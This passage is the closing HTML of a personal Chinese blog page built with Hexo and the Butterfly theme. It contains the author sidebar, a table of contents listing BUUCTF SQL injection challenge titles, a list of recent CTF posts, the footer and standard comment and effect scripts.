class="label">下一篇</div><div class="next_info">typora+gitee+picgo建立云图床笔记</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://gitee.com/csrcsyh/note/raw/master/img/20211012202654.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">FakerCsr</div><div class="author-info__description">Welcome to magic box</div></div><div class="card-info-data is-center"><div class="card-info-data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">9</div></a></div><div class="card-info-data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a></div><div class="card-info-data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/FackCsr" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="/979280582@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%99%E5%87%A0%E9%81%93%E9%A2%98%E6%88%91%E9%83%BD%E6%98%AF%E5%9C%A8BUUCTF%E9%87%8C%E5%86%99%E5%88%B0%E7%9A%84-%E5%AF%B9%E4%BA%8E%E6%88%91%E4%BB%ACsql%E6%B3%A8%E5%85%A5%E5%85%A5%E9%97%A8%E8%BF%98%E6%98%AF%E5%BE%88%E4%B8%8D%E9%94%99%E7%9A%84%E5%87%A0%E9%81%93%E9%A2%98"><span class="toc-number">1.</span> <span class="toc-text">这几道题我都是在BUUCTF里写到的 对于我们sql注入入门还是很不错的几道题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL"><span class="toc-number">2.</span> <span class="toc-text">[极客大挑战 2019]EasySQL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-LoveSQL"><span class="toc-number">3.</span> <span class="toc-text">[极客大挑战 2019]LoveSQL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BabySQL"><span class="toc-number">4.</span> <span class="toc-text">[极客大挑战 2019]BabySQL</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/df29eeb2/" title="攻防世界的部分进阶web题"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./img/13.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="攻防世界的部分进阶web题"/></a><div class="content"><a class="title" href="/posts/df29eeb2/" title="攻防世界的部分进阶web题">攻防世界的部分进阶web题</a><time datetime="2021-10-13T13:30:51.133Z" title="发表于 2021-10-13 21:30:51">2021-10-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/df29eeb2/" title="buuctf web题的wp"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./img/1.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="buuctf web题的wp"/></a><div class="content"><a class="title" href="/posts/df29eeb2/" title="buuctf web题的wp">buuctf web题的wp</a><time datetime="2021-10-13T13:30:51.127Z" title="发表于 2021-10-13 21:30:51">2021-10-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/ecd8242f/" title="CTFshow-web入门-命令执行"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./img/6.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CTFshow-web入门-命令执行"/></a><div class="content"><a class="title" href="/posts/ecd8242f/" title="CTFshow-web入门-命令执行">CTFshow-web入门-命令执行</a><time datetime="2021-10-13T13:30:51.123Z" title="发表于 2021-10-13 21:30:51">2021-10-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/289d493d/" title="CTFshow-web入门-信息搜集"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./img/5.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CTFshow-web入门-信息搜集"/></a><div class="content"><a class="title" href="/posts/289d493d/" title="CTFshow-web入门-信息搜集">CTFshow-web入门-信息搜集</a><time datetime="2021-10-13T13:30:51.120Z" title="发表于 2021-10-13 21:30:51">2021-10-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/dda27d6/" title="bugku cookies欺骗"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./img/2.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="bugku cookies欺骗"/></a><div class="content"><a class="title" href="/posts/dda27d6/" title="bugku cookies欺骗">bugku cookies欺骗</a><time datetime="2021-10-13T13:30:51.112Z" title="发表于 2021-10-13 21:30:51">2021-10-13</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By FakerCsr</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: '',
+      appKey: '',
+      avatar: 'monsterid',
+      serverURLs: '',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !false) {
+  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = false;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-show-text.min.js" data-mobile="false" data-text="富强,民主,文明,和谐,自由,平等,公正,法治,爱国,敬业,诚信,友善" data-fontsize="15px" data-random="false" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
